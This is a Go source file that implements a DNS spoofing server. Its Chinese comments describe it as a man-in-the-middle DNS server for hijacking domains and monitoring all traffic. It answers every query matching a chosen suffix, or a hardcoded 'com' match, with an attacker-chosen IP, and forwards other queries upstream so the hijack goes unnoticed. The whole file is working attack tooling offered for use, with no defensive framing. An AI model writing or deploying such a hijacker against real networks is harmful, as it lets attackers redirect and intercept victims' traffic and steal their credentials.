package dns

import (
	"fmt"
	"github.com/miekg/dns"
	"log"
	"strings"
)

// ServeDNS 启动中间人DNS服务器
// 会将所有的DNS请求转发到一个指定IP 用于中间人攻击 全流量监听
// DomainSuffix 为. 就是所有的域名都会被劫持到指定IP
func ServeDNS(address string, DomainSuffix string, yourIP string) error {
	server := &dns.Server{Addr: address, Net: "udp"}

	// 设置 DNS 处理函数
	dns.HandleFunc(".", func(w dns.ResponseWriter, r *dns.Msg) {
		m := new(dns.Msg)
		m.SetReply(r)

		// 处理 DNS 请求，这里可以根据需要添加自定义逻辑

		for _, q := range r.Question {
			// 查询域名和对应的 IP 地址
			domain := strings.ToLower(q.Name)

			if strings.Index(domain, DomainSuffix) != -1 { // 如果是需要劫持的域名
				ip := yourIP // 替换为你想要映射的 IP 地址
				fmt.Println(domain)
				// 构建 DNS 回答
				rr, err := dns.NewRR(fmt.Sprintf("%s IN A %s", domain, ip))
				if err != nil {
					log.Printf("Error creating DNS response: %v", err)
					continue
				}
				// 添加回答到 DNS 消息
				m.Answer = append(m.Answer, rr)

			} else {
				qDomain := domain[:len(domain)-1]
				msg, err := resolveDNS("114.114.114.114:53", qDomain)
				if err != nil {
					log.Printf("Error creating DNS response: %v", err)
					continue
				}

				m.Answer = append(m.Answer, msg.Answer...)
			}

		}

		// 发送 DNS 响应
		if err := w.WriteMsg(m); err != nil {
			log.Printf("Error writing DNS response: %v", err)
		}
	})

	log.Printf("Starting DNS server on %s\n", address)
	return server.ListenAndServe()
}

func handleDNSRequest(w dns.ResponseWriter, r *dns.Msg) {
	m := new(dns.Msg)
	m.SetReply(r)

	// 处理 DNS 请求，这里可以根据需要添加自定义逻辑

	for _, q := range r.Question {
		// 查询域名和对应的 IP 地址
		domain := strings.ToLower(q.Name)

		if strings.Index(domain, "com") != -1 {
			ip := "192.168.3.45" // 替换为你想要映射的 IP 地址
			fmt.Println(domain)
			// 构建 DNS 回答
			rr, err := dns.NewRR(fmt.Sprintf("%s IN A %s", domain, ip))
			if err != nil {
				log.Printf("Error creating DNS response: %v", err)
				continue
			}
			// 添加回答到 DNS 消息
			m.Answer = append(m.Answer, rr)

		} else {
			qDomain := domain[:len(domain)-1]
			msg, err := resolveDNS("114.114.114.114:53", qDomain)
			if err != nil {
				log.Printf("Error creating DNS response: %v", err)
				continue
			}

			m.Answer = append(m.Answer, msg.Answer...)
		}

	}

	// 发送 DNS 响应
	if err := w.WriteMsg(m); err != nil {
		log.Printf("Error writing DNS response: %v", err)
	}
}

// resolveDNS 向指定的 DNS 服务器发送解析请求 用于向上解析避免劫持不必要的程序
func resolveDNS(server string, domain string) (*dns.Msg, error) {
	// 创建 DNS 消息
	msg := new(dns.Msg)
	msg.SetQuestion(domain+".", dns.TypeA)

	// 向 DNS 服务器发送解析请求
	res, err := dns.Exchange(msg, server)
	if err != nil {
		return res, err
	}

	for _, rr := range res.Answer {
		fmt.Println(rr.String())
	}
	return res, err
}
